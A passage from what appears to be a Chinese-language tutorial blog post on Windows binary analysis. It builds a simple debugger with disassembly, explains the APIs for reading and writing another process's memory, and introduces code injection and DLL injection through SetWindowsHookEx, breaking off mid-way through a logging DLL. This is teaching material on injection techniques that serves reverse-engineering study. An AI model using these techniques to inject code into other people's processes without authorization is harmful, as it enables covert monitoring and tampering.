  <span class="n">DWORD</span> <span class="n">dwProcessId</span><span class="p">;</span>
  <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span>
  <span class="k">union</span> <span class="p">{</span>
    <span class="n">EXCEPTION_DEBUG_INFO</span>      <span class="n">Exception</span><span class="p">;</span>
    <span class="n">CREATE_THREAD_DEBUG_INFO</span>  <span class="n">CreateThread</span><span class="p">;</span>
    <span class="n">CREATE_PROCESS_DEBUG_INFO</span> <span class="n">CreateProcessInfo</span><span class="p">;</span>
    <span class="n">EXIT_THREAD_DEBUG_INFO</span>    <span class="n">ExitThread</span><span class="p">;</span>
    <span class="n">EXIT_PROCESS_DEBUG_INFO</span>   <span class="n">ExitProcess</span><span class="p">;</span>
    <span class="n">LOAD_DLL_DEBUG_INFO</span>       <span class="n">LoadDll</span><span class="p">;</span>
    <span class="n">UNLOAD_DLL_DEBUG_INFO</span>     <span class="n">UnloadDll</span><span class="p">;</span>
    <span class="n">OUTPUT_DEBUG_STRING_INFO</span>  <span class="n">DebugString</span><span class="p">;</span>
    <span class="n">RIP_INFO</span>                  <span class="n">RipInfo</span><span class="p">;</span>
  <span class="p">}</span> <span class="n">u</span><span class="p">;</span>
<span class="p">}</span> <span class="n">DEBUG_EVENT</span><span class="p">,</span> <span class="o">*</span><span class="n">LPDEBUG_EVENT</span><span class="p">;</span>
</code></pre></div></div>

<p>其中第一个成员dwDebugEventCode代表调试事件编号。
<code class="highlighter-rouge">dwProcessID</code>为进程ID，<code class="highlighter-rouge">dwThreadID</code>为线程ID。</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">调试事件</th>
      <th style="text-align: right">含义</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">CREATE_PROCESS_DEBUG_EVEN</td>
      <td style="text-align: right">创建进程</td>
    </tr>
    <tr>
      <td style="text-align: left">CREATE_THREAD_DEBUG_EVENT</td>
      <td style="text-align: right">创建线程</td>
    </tr>
    <tr>
      <td style="text-align: left">EXCEPTION_DEBUG_EVENT</td>
      <td style="text-align: right">发生异常</td>
    </tr>
    <tr>
      <td style="text-align: left">EXIT_PROCESS_DEBUG_EVENT</td>
      <td style="text-align: right">进程结束</td>
    </tr>
    <tr>
      <td style="text-align: left">EXIT_THREAD_DEBUG_EVENT</td>
      <td style="text-align: right">线程结束</td>
    </tr>
    <tr>
      <td style="text-align: left">LOAD_DLL_DEBUG_EVENT</td>
      <td style="text-align: right">加载DLL</td>
    </tr>
    <tr>
      <td style="text-align: left">OUTPUT_DEBUG_STRING_EVENT</td>
      <td style="text-align: right">调用OutputDebugString函数</td>
    </tr>
    <tr>
      <td style="text-align: left">RIP_EVENT</td>
      <td style="text-align: right">系统调试错误</td>
    </tr>
    <tr>
      <td style="text-align: left">UNLOAD_DLL_DEBUG_EVENT</td>
      <td style="text-align: right">卸载DLL</td>
    </tr>
  </tbody>
</table>

<blockquote>
  <p>wdbg01a.cpp中，当接收到调试事件时，会使用printf函数将事件的内容显示出来。通过访问union定义的结构体就可获得调试对象的信息
当处理器被交给调试器时，调试对象会暂停运行。因此，在调试器显示消息的过程中，调试对象出于暂停状态。
调用ContinueDebugEvent函数可以让调试对象恢复运行，这时调试器又回到WaitForDebugEvent函数等待下一条调试事件。</p>
</blockquote>

<p>运行示例：
<img src="/img/interestingBin/1489219141371.png" alt="调试IE" /></p>

<blockquote>
  <p>创建进程、线程、以及加载、卸载DLL等事件被调试器捕捉到。</p>
</blockquote>

<h3 id="实现反汇编功能">实现反汇编功能</h3>

<p>在发生异常的时候，能够显示发生异常的地址以及当前寄存器的值，也能显示发生异常时所执行的指令，这就要实现反汇编功能。</p>

<p>可以使用<a href="https://github.com/vmt/udis86">udis86</a>这个开源的反汇编器实现反汇编。(本书作者提供的编译后的版本https://github.com/kenjiaiko/udis86)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include "stdafx.h"
</span>
<span class="cp">#include &lt;Windows.h&gt;
#include "udis86.h"
</span>
<span class="cp">#pragma comment(lib, "libudis86.lib")
</span>

<span class="kt">int</span> <span class="nf">disas</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ud_t</span> <span class="n">ud_obj</span><span class="p">;</span>
	<span class="n">ud_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">);</span>
	<span class="n">ud_set_input_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>

	<span class="n">ud_set_mode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>

	<span class="n">ud_set_syntax</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">,</span> <span class="n">UD_SYN_INTEL</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="n">ud_disassemble</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">)){</span>
		<span class="n">sprintf_s</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="s">"%14s  %s"</span><span class="p">,</span> 
			<span class="n">ud_insn_hex</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">),</span> <span class="n">ud_insn_asm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">));</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">ud_insn_len</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ud_obj</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">exception_debug_event</span><span class="p">(</span><span class="n">DEBUG_EVENT</span> <span class="o">*</span><span class="n">pde</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">DWORD</span> <span class="n">dwReadBytes</span><span class="p">;</span>

	<span class="n">HANDLE</span> <span class="n">ph</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span>
		<span class="n">PROCESS_VM_WRITE</span> <span class="o">|</span> <span class="n">PROCESS_VM_READ</span> <span class="o">|</span> <span class="n">PROCESS_VM_OPERATION</span><span class="p">,</span> 
		<span class="n">FALSE</span><span class="p">,</span> <span class="n">pde</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">ph</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="n">HANDLE</span> <span class="n">th</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_GET_CONTEXT</span> <span class="o">|</span> <span class="n">THREAD_SET_CONTEXT</span><span class="p">,</span> 
		<span class="n">FALSE</span><span class="p">,</span> <span class="n">pde</span><span class="o">-&gt;</span><span class="n">dwThreadId</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">th</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
	<span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_ALL</span><span class="p">;</span>
	<span class="n">GetThreadContext</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	
	<span class="kt">char</span> <span class="n">asm_string</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">asm_code</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>

	<span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">ph</span><span class="p">,</span> <span class="p">(</span><span class="n">VOID</span> <span class="o">*</span><span class="p">)</span><span class="n">ctx</span><span class="p">.</span><span class="n">Eip</span><span class="p">,</span> <span class="n">asm_code</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwReadBytes</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">disas</span><span class="p">(</span><span class="n">asm_code</span><span class="p">,</span> <span class="n">asm_string</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">asm_string</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
		<span class="n">asm_string</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Exception: %08x (PID:%d, TID:%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> 
		<span class="n">pde</span><span class="o">-&gt;</span><span class="n">u</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">ExceptionRecord</span><span class="p">.</span><span class="n">ExceptionAddress</span><span class="p">,</span>
		<span class="n">pde</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">,</span> <span class="n">pde</span><span class="o">-&gt;</span><span class="n">dwThreadId</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"  %08x: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Eip</span><span class="p">,</span> <span class="n">asm_string</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"    Reg: EAX=%08x ECX=%08x EDX=%08x EBX=%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> 
		<span class="n">ctx</span><span class="p">.</span><span class="n">Eax</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Ecx</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Edx</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Ebx</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"         ESI=%08x EDI=%08x ESP=%08x EBP=%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> 
		<span class="n">ctx</span><span class="p">.</span><span class="n">Esi</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Edi</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Esp</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Ebp</span><span class="p">);</span>

	<span class="n">SetThreadContext</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">th</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">ph</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">_tmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">_TCHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span>
	<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
	
	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">&gt;%s &lt;sample.exe&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>
	<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
	<span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">);</span>

	<span class="n">BOOL</span> <span class="n">r</span> <span class="o">=</span> <span class="n">CreateProcess</span><span class="p">(</span>
		<span class="nb">NULL</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> 
		<span class="n">NORMAL_PRIORITY_CLASS</span> <span class="o">|</span> <span class="n">CREATE_SUSPENDED</span> <span class="o">|</span> <span class="n">DEBUG_PROCESS</span><span class="p">,</span>
		<span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">r</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

	<span class="kt">int</span> <span class="n">process_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">do</span><span class="p">{</span>
		<span class="n">DEBUG_EVENT</span> <span class="n">de</span><span class="p">;</span>
		<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">WaitForDebugEvent</span><span class="p">(</span><span class="o">&amp;</span><span class="n">de</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">))</span>
			<span class="k">break</span><span class="p">;</span>
		
		<span class="n">DWORD</span> <span class="n">dwContinueStatus</span> <span class="o">=</span> <span class="n">DBG_CONTINUE</span><span class="p">;</span>
		
		<span class="k">switch</span><span class="p">(</span><span class="n">de</span><span class="p">.</span><span class="n">dwDebugEventCode</span><span class="p">)</span>
		<span class="p">{</span>
		<span class="k">case</span> <span class="n">CREATE_PROCESS_DEBUG_EVENT</span><span class="p">:</span>
			<span class="n">process_counter</span><span class="o">++</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">EXIT_PROCESS_DEBUG_EVENT</span><span class="p">:</span>
			<span class="n">process_counter</span><span class="o">--</span><span class="p">;</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="k">case</span> <span class="n">EXCEPTION_DEBUG_EVENT</span><span class="p">:</span>
			<span class="k">if</span><span class="p">(</span><span class="n">de</span><span class="p">.</span><span class="n">u</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">ExceptionRecord</span><span class="p">.</span><span class="n">ExceptionCode</span> <span class="o">!=</span> 
				<span class="n">EXCEPTION_BREAKPOINT</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">dwContinueStatus</span> <span class="o">=</span> <span class="n">DBG_EXCEPTION_NOT_HANDLED</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">exception_debug_event</span><span class="p">(</span><span class="o">&amp;</span><span class="n">de</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">ContinueDebugEvent</span><span class="p">(</span>
			<span class="n">de</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">,</span> <span class="n">de</span><span class="p">.</span><span class="n">dwThreadId</span><span class="p">,</span> <span class="n">dwContinueStatus</span><span class="p">);</span>

	<span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="n">process_counter</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>

	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>disas函数负责对机器语言进行反汇编，在此使用了udis86的功能。</p>

<p><code class="highlighter-rouge">execption_debug_event</code>函数会在发生异常时运行，其中调用了下列函数：</p>

<ul>
  <li><code class="highlighter-rouge">OpenProcess</code>（https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx）</li>
  <li><code class="highlighter-rouge">ReadProcessMemory</code>(https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx)</li>
  <li><code class="highlighter-rouge">OpenThread</code>(https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335(v=vs.85).aspx)</li>
  <li><code class="highlighter-rouge">GetThreadContext</code>(https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362(v=vs.85).aspx)</li>
  <li><code class="highlighter-rouge">SetThreadContext</code>()</li>
</ul>

<p>以上函数再加上<code class="highlighter-rouge">WriteProcessMemory</code>数（https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx），就是用于访问其他进程的必要函数。</p>

<p>在Windows中，即便程序不作为调试器挂载在目标进程上，只要能够获取目标进程的句柄，就可随意读写该进程的内存空间。若当前用户没有相应的权限，调用OpenProcess会失败，但只要能够通过其他方法获取进程句柄，也可自由读写该进程的内存空间。</p>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx">OpenProcess</a>函数：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="n">OpenProcess</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="c1">//访问标志
</span>  <span class="n">_In_</span> <span class="n">BOOL</span>  <span class="n">bInheritHandle</span><span class="p">,</span>  <span class="c1">//句柄继承选项
</span>  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">dwProcessId</span> <span class="c1">//进程ID
</span><span class="p">);</span>
</code></pre></div></div>

<p>在<code class="highlighter-rouge">exeception_debug_event</code>函数中，为了获取发生异常时所执行的指令，需要<code class="highlighter-rouge">ReadProcessMemory</code>函数。</p>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553(v=vs.85).aspx">ReadProcessMemory</a>函数：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">ReadProcessMemory</span><span class="p">(</span>
  <span class="n">_In_</span>  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span> <span class="c1">//进程句柄
</span>  <span class="n">_In_</span>  <span class="n">LPCVOID</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="c1">//读取起始地址
</span>  <span class="n">_Out_</span> <span class="n">LPVOID</span>  <span class="n">lpBuffer</span><span class="p">,</span> <span class="c1">//存放数据的缓冲区
</span>  <span class="n">_In_</span>  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span> <span class="c1">//要读取字节数
</span>  <span class="n">_Out_</span> <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesRead</span> <span class="c1">//实际读取字节数
</span><span class="p">);</span>
</code></pre></div></div>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx">WriteProcessMemory</a>函数：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">WriteProcessMemory</span><span class="p">(</span>
  <span class="n">_In_</span>  <span class="n">HANDLE</span>  <span class="n">hProcess</span><span class="p">,</span> <span class="c1">//进程句柄
</span>  <span class="n">_In_</span>  <span class="n">LPVOID</span>  <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="c1">//写入起始地址
</span>  <span class="n">_In_</span>  <span class="n">LPCVOID</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="c1">//数据缓冲区
</span>  <span class="n">_In_</span>  <span class="n">SIZE_T</span>  <span class="n">nSize</span><span class="p">,</span>  <span class="c1">//要写入的字节数
</span>  <span class="n">_Out_</span> <span class="n">SIZE_T</span>  <span class="o">*</span><span class="n">lpNumberOfBytesWritten</span> <span class="c1">//实际写入的字节数
</span><span class="p">);</span>
</code></pre></div></div>
<p>接下来是对寄存器的读写：
用<code class="highlighter-rouge">OpenThread</code>打开线程之后，可通过<code class="highlighter-rouge">GetThreadContext</code>和<code class="highlighter-rouge">SetThreadContext</code>来读写寄存器。</p>

<p>由于不需要在execption_debug_event中改写寄存器的值，因此不需要调用SetThreadContext函数。</p>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335(v=vs.85).aspx">OpenThread</a>函数：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="n">OpenThread</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="c1">//访问标志
</span>  <span class="n">_In_</span> <span class="n">BOOL</span>  <span class="n">bInheritHandle</span><span class="p">,</span> <span class="c1">//句柄继承选项
</span>  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">dwThreadId</span>  <span class="c1">//线程ID
</span><span class="p">);</span>
</code></pre></div></div>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362(v=vs.85).aspx">GetThreadContext</a>函数：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">GetThreadContext</span><span class="p">(</span>
  <span class="n">_In_</span>    <span class="n">HANDLE</span>    <span class="n">hThread</span><span class="p">,</span> <span class="c1">//拥有上下文的线程句柄
</span>  <span class="n">_Inout_</span> <span class="n">LPCONTEXT</span> <span class="n">lpContext</span> <span class="c1">//接收上下文的结构体地址
</span><span class="p">);</span>
</code></pre></div></div>

<p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms680632(v=vs.85).aspx">SetThreadContext</a></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">SetThreadContext</span><span class="p">(</span>
  <span class="n">_In_</span>       <span class="n">HANDLE</span>  <span class="n">hThread</span><span class="p">,</span> <span class="c1">//拥有上下文的线程句柄
</span>  <span class="n">_In_</span> <span class="k">const</span> <span class="n">CONTEXT</span> <span class="o">*</span><span class="n">lpContext</span> <span class="c1">//存放上下文的结构体地址
</span><span class="p">);</span>
</code></pre></div></div>

<p>使用这些API函数就可操作其他进程。</p>

<p>使用改良版的调试器wdbg02a.exe对 一个异常程序test.exe调试：</p>

<p><img src="/img/interestingBin/1489224170719.png" alt="改良调试器" /></p>

<p>在 mov byte[eax]，0xff的地方发生了第二个异常，对应test.exe源码中的<code class="highlighter-rouge">*s=0xFF</code>这行。</p>

<h2 id="代码注入">代码注入</h2>

<p>在其他进程中运行任意代码的手法，统称为代码注入。在使用DLL的情况下，一般叫做“DLL注入”，但“在其他进程中运行自己的代码”这点是共通的。</p>

<p><img src="/img/interestingBin/1491402463265.png" alt="代码注入" /></p>

<p>首先向目标进程target.exe插入代码与数据，在此过程中，代码以线程(Thread Procedure)形式插入，而代码中使用的数据则以线程参数的形式传入。即代码与数据是分别注入的。</p>

<p>关于代码注入知名文章：
<a href="https://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Proces">Three-Ways-to-Inject-Your-Code-into-Another-Proces</a></p>

<h3 id="用setwindowshookex劫持系统消息">用SetWindowsHookEx劫持系统消息</h3>

<p>用以下三个API函数，可以劫持系统消息</p>
<ul>
  <li>SetWindowsHookEx</li>
  <li>CallNextHookEx</li>
  <li>UnhookWindowsHookEx</li>
</ul>

<blockquote>
  <p>这些函数都是Windows官方API ，可以因为用于单个线程，也可以用于进程</p>
</blockquote>

<blockquote>
  <p>SetWidowsHookEx的功能是将原本传递给窗口过程的消息劫持下来，交给第二参数所指定的函数来进行处理</p>
</blockquote>

<p>SetWindowsHookEx:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HHOOK</span> <span class="n">WINAPI</span> <span class="n">SetWindowsHookEx</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="kt">int</span>       <span class="n">idHook</span><span class="p">,</span> <span class="c1">//钩子类型
</span>  <span class="n">_In_</span> <span class="n">HOOKPROC</span>  <span class="n">lpfn</span><span class="p">,</span> <span class="c1">//钩子过程
</span>  <span class="n">_In_</span> <span class="n">HINSTANCE</span> <span class="n">hMod</span><span class="p">,</span> <span class="c1">//应用程序实例的句柄
</span>  <span class="n">_In_</span> <span class="n">DWORD</span>     <span class="n">dwThreadId</span> <span class="c1">//线程ID
</span><span class="p">);</span>
</code></pre></div></div>

<p>CallNextHookEx：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LRESULT</span> <span class="n">WINAPI</span> <span class="n">CallNextHookEx</span><span class="p">(</span>
  <span class="n">_In_opt_</span> <span class="n">HHOOK</span>  <span class="n">hhk</span><span class="p">,</span> <span class="c1">//当前钩子的句柄
</span>  <span class="n">_In_</span>     <span class="kt">int</span>    <span class="n">nCode</span><span class="p">,</span>  <span class="c1">//传递给钩子过程的代码
</span>  <span class="n">_In_</span>     <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span> <span class="c1">//传递给钩子过程的值
</span>  <span class="n">_In_</span>     <span class="n">LPARAM</span> <span class="n">lParam</span> <span class="c1">//传递给钩子过程的值
</span><span class="p">);</span>
</code></pre></div></div>

<p>UnhookWindowsHookEx：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">UnhookWindowsHookEx</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">HHOOK</span> <span class="n">hhk</span>   <span class="c1">//要解除的对象的钩子过程句柄
</span><span class="p">);</span>
</code></pre></div></div>

<p>例子：</p>

<p>将loging.cpp编译成DLL，然后调用SetWindowsHookEx，将其第4参数(dwThreadId)设为0.这样就可以对持有窗口过程的进程和线程应用钩子，也就是加载目标DLL。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// dllmain.cp
//
</span>
<span class="cp">#include "stdafx.h"
</span>

<span class="kt">int</span> <span class="nf">WriteLog</span><span class="p">(</span><span class="n">TCHAR</span> <span class="o">*</span><span class="n">szData</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">TCHAR</span> <span class="n">szTempPath</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
	<span class="n">GetTempPath</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">szTempPath</span><span class="p">),</span> <span class="n">szTempPath</span><span class="p">);</span>
	<span class="n">lstrcat</span><span class="p">(</span><span class="n">szTempPath</span><span class="p">,</span> <span class="s">"loging.log"</span><span class="p">);</span>
	
	<span class="n">TCHAR</span> <span class="n">szModuleName</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
	<span class="n">GetModuleFileName</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="nb">NULL</span><span class="p">),</span> 
		<span class="n">szModuleName</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">szModuleName</span><span class="p">));</span>

	<span class="n">TCHAR</span> <span class="n">szHead</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
	<span class="n">wsprintf</span><span class="p">(</span><span class="n">szHead</span><span class="p">,</span> <span class="s">"[PID:%d][Module:%s] "</span><span class="p">,</span> 
		<span class="n">GetCurrentProcessId</span><span class="p">(),</span> <span class="n">szModuleName</span><span class="p">);</span>

	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span>
		<span class="n">szTempPath</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
		<span class="n">OPEN_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

	<span class="n">SetFilePointer</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FILE_END</span><span class="p">);</span>

	<span class="n">DWORD</span> <span class="n">dwWriteSize</span><span class="p">;</span>
